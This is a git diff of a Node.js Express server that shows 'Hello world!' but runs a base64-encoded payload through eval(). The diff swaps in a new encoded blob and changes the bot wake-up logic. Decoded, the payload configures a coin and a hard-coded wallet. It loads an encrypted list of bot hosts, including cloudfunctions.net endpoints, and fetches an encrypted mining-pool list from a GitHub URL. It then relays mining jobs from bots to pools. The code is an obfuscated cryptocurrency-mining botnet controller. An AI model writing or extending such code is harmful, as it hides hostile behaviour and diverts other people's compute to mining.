@@ -5,20 +5,14 @@ const CryptoJS = require("crypto-js");
 const express=require('express');
 const app=express();
 app.get('/',function(req,res) { 
-  if(req.query.active) {
-    res.json({
-      c: c, yellow_pools: yellow_pools,
-      pools: mylist(pools), bots: mylist(bots)
-    })
-  }
+  if(req.query.active) res.json({ c: c, pools: mylist(pools), bots: mylist(bots) })
   else { res.send('Hello world!') }
 });
 var s=app.listen(process.env.PORT||5000,()=>console.log(c.id+' Listening on port '+s.address().port));
 
 var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };
 
-var c = { active: 0, id: 1, state: 'orange' }
-var yellow_pools = false;
+var c = { active: 0, state: 'orange', yellow_pools: false }
 var rec = false;
 
 var pools = []; var bots = [];
@@ -26,11 +20,12 @@ var pools = []; var bots = [];
 var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
 (`AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgvXHJ8XG4vKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfTsKY
 y5jb2luID0gJ1R1YmUnOwpjLndhbGxldCA9ICdieGNuTHZ5WU5xYUQ0RDZRZEp5ektmY2pKNlFjTUxnTVcyRE1xRVNVcTh4OUpFTTlmQWc2Y2tXRG5hMlhFajJNOEhmQ1A4RXpjYm5TR2JrWUZndmJ6SHZtMlZBT
-jRrOEY2JzsKYy5oYXNoID0gJzAgaC9zIDAvMCc7CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLnBlZXJzID0gW2xpc3Quc2hpZ
-nQoKV07IGMucGVlcnMucHVzaChsaXN0LnNoaWZ0KCkpOwpmb3IodmFyIGk9MDsgaTxsaXN0Lmxlbmd0aDsgaSsrKSB7IGxldCBuYm90PXtob3N0Omxpc3RbaV0sIHN0YXRlOidvcmFuZ2UnLCBoYXNoOicwIGgvc
-yBbMC8wXSd9OyBib3RzLnB1c2gobmJvdCk7IHdha2V1cChuYm90KSB9OwpyZXF1ZXN0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2J1dGNoL215cG9vbC9tYXN0ZXIvcG9vbHMudHh0JywgZ
-nVuY3Rpb24oZXJyLCByZXMsIGJvZHkpIHsKICB2YXIgbGlzdCA9IGRlY3J5cHQoYm9keSkuc3BsaXQoJ1xyXG4nKTsKICB2YXIgbXljb2luID0gcmVxdWlyZSgnLi8nK2MuY29pbisnLmpzJyk7CiAgZm9yKHZhc
-iBpPTA7IGk8bGlzdC5sZW5ndGg7IGkrKykgcG9vbHMucHVzaChuZXcgbXljb2luKHsgd2FsbGV0OiBjLndhbGxldCwgaG9zdDogbGlzdFtpXSB9KSk7Cn0pOw==`)
+jRrOEY2JzsKYy5oYXNoID0gJzAgaC9zIDAvMCc7CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc
+2hpZnQoKSk7CmMucGVlcnMgPSBbbGlzdC5zaGlmdCgpXTsgYy5wZWVycy5wdXNoKGxpc3Quc2hpZnQoKSk7CmZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpX
+Swgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVwKG5ib3QsdHJ1ZSkgfTsKcmVxdWVzdCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL
+3NidXRjaC9teXBvb2wvbWFzdGVyL3Bvb2xzLnR4dCcsIGZ1bmN0aW9uKGVyciwgcmVzLCBib2R5KSB7CiAgdmFyIGxpc3QgPSBkZWNyeXB0KGJvZHkpLnNwbGl0KCdcclxuJyk7CiAgdmFyIG15Y29pbiA9IHJlc
+XVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwogIGZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHBvb2xzLnB1c2gobmV3IG15Y29pbih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkpO
+wp9KTs=`)
 
 var superbot = decrypt(fs.readFileSync('superbot.js','utf8'));
 var worker = superbot+'\n'+decrypt(`
@@ -48,10 +43,13 @@ function mylist(obj) {
   return result
 }
 
-function wakeup(bot) {
+function wakeup(bot,now) {
   bot.msg = "wakeup";
-  bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
-  bot.wakecount = 60
+  if(now) onmsg(bot)
+  else {
+    bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
+    bot.wakecount = 60
+  }
 }
 
 function onmsg(bot) {
@@ -59,7 +57,7 @@ function onmsg(bot) {
   if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
     for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
       if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
-        pools[i].mysubmit(bot.msg[j],yellow_pools);
+        pools[i].mysubmit(bot.msg[j],c.yellow_pools);
         break;
       };
     };
@@ -87,7 +85,7 @@ function onmsg(bot) {
       bot.hash = body.hash;
       bot.msg = body.msg;
       if(next) return onmsg(bot);
-      else return wakeup(bot)
+      else return wakeup(bot,true)
     }
     if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
     else bot.state = 'red'; 
